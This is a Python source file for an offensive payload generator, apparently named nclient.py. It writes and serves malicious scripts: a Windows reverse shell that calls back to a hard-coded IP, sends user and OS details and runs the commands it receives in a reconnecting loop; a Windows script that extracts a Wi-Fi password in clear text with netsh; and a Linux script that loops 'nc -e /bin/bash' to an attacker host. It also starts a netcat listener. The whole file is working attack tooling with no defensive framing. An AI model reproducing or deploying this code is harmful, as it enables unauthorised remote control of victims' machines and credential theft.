import sys
import os
import time
from socket import *


def error_out():
    print("invalid argument")
    print("python3 nclient.py [Option] [argument1] [argument2]")
    print("")
    print("Options:")
    print("")
    print("1                                    windows")
    print("")
    print("2                                    linux")
    exit()

try:
    if sys.argv[1] == "1":
        try:
            if sys.argv[2] == "1":
                try:
                    LHOST = sys.argv[3]
                    LPORT = sys.argv[4]
                except IndexError:
                    print("invalid argument")
                    print("try: python3 nclient.py 1 1 LHOST LPORT")
                    exit()
                    
                
            
                def socket_server():

                    ip = f"{LHOST}"
                    port = int(LPORT)

                    connection = socket(AF_INET, SOCK_STREAM)
                    connection.bind((ip, port))

                    connection.listen(5)
                    client, addr = connection.accept()
                    print("connect -> "+str(addr))
                    print("type exit to quit")
                    def main_func():
                        while True:
                            recever = client.recv(2000).decode()
                            print(recever)
                            cmd = input("The-Plague>")
                            
                            
                                
                            if cmd == "exit" :
                                client.send(cmd.encode())
                                exit()
                            elif cmd == "" or cmd == None:
                                cmd = "error"
                                client.send(cmd.encode())
                            
                            else:
                                client.send(cmd.encode())
                    main_func()
                f = open("windows_r_shell.py", "w")
                f.write(f'''from getpass import getuser
from socket import * 
import subprocess
import platform
import os 
import time

get_os = platform.uname()
get_user = getuser()
os_info = "client_name : "+str(get_user)+" <-> "+"client_os : "+str(get_os)

ip = "192.168.1.14"

port = 87
connection = socket(AF_INET, SOCK_STREAM)
def final_func():
    def conn_func():
        connection.connect((ip, port))
        connection.send(os_info.encode())
        while True:
            recever = connection.recv(2000).decode()

            if recever == "exit":
                exit()
            elif recever[:2] == "cd":
                try:
                    os.chdir(recever[3:])
                except:
                    pass
                connection.send(os.getcwd().encode())
            elif recever == "":
                os.chdir(recever[3:])
                connection.send(os.getcwd().encode())

            else:
                out_put = subprocess.getoutput(recever)

                if out_put == "" or out_put == None:
                    out_put = ""
                    connection.send(out_put.encode())
                else:
                    connection.send(out_put.encode())
    try:
        conn_func()
    except:
        pass
while True:
    time.sleep(2)
    final_func()
''')
                f.close()
                listener = input("do you want to start a listener y/n: ")
                if listener == "y" or listener == "Y":
                    print("Listening...")
                    socket_server()
                else:
                    exit()

                 
        
            if sys.argv[2] == "2":

                try:
                    wifi_name = sys.argv[3]
                except IndexError:
                    print("invalid argument")
                    print('try: python3 nclient.py 1 2 Wifi_name')
                    exit()
                f = open("payload.py", "w")
                f.write(f'''import os
import time
import platform
if platform.platform()[0:3] == "Win":
    command = os.popen('netsh wlan show profile name="{wifi_name}" key=clear')
    cmd_out = command.read()
    f = open("wifi-pass.txt", "a")
    f.write(cmd_out)
    f.write("========================================================================")
else:
    exit()''')
        except IndexError:
            print("invalid argument")
            print("try:  python3 nclient.py 1 [argument]")
            print("")
            print("1                          windows reverse shell ")
            print("")
            print("2                          windows extract wifi passwords")
            exit()


    elif sys.argv[1] == "2":
        try:
            LHOST = sys.argv[2]
            LPORT = sys.argv[3]
        except IndexError:
            print("invalid argument")
            print('try: python3 nclient.py 2 LHOST LPORT')
            exit()
        try:
            int(LPORT)
        except ValueError:
            print("invalid LHOST")
            exit()
        if len(LHOST) > 15:
            print("invalid LHOST")
            exit()
        elif len(LHOST) < 9:
            print("invalid LHOST")
            exit()
        f = open("r-shell.py", "w")
        f.write(f'''import os
import time
import platform
try:
    if platform.platform()[0:3] == "Lin":
        while(True):
            os.system("nc -e /bin/bash {LHOST} {LPORT}")
            time.sleep(10)
except:
    print()''')
        f.close()
       
        os.system(f"nc -lnvp {LPORT} -s {LHOST}")
       
            
    else:
        error_out()
        


except IndexError:
    error_out()
    



